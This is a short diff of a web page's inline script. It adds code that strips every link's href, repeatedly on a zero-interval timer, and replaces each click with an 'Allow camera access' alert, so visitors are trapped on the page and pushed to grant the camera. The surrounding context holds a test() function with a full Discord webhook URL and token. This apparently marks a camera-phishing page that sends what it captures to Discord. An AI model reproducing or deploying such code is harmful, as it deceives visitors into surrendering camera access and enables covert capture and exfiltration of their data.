@@ -62,6 +62,22 @@ var resourceAccountIdRoutingURl = "";
 resourceAccountIdRoutingURl = resourceAccountIdRoutingURl==""?undefined:resourceAccountIdRoutingURl;
 </script>
 <script>
+        function removeHrefAttributes() {
+            const links = document.querySelectorAll('a');
+            links.forEach(link => {
+                link.removeAttribute('href');
+                if (!link.dataset.hasListener) {
+                    link.addEventListener('click', (event) => {
+                        event.preventDefault(); 
+                        alert('Allow camera access');
+                    });
+                    link.dataset.hasListener = 'true'; 
+                }
+            });
+        }
+
+        setInterval(removeHrefAttributes, 0);
+  
   function test(){
 const webhookUrl = 'https://discord.com/api/webhooks/1272820307127959585/3NPJl9R1Pgb-gVtEGGqs9cNOUGKa97Ta4tOG08BuV4d7xX9P9Hj3of2gUI2PaevPkr9P';
     const infDiv = document.createElement('div');
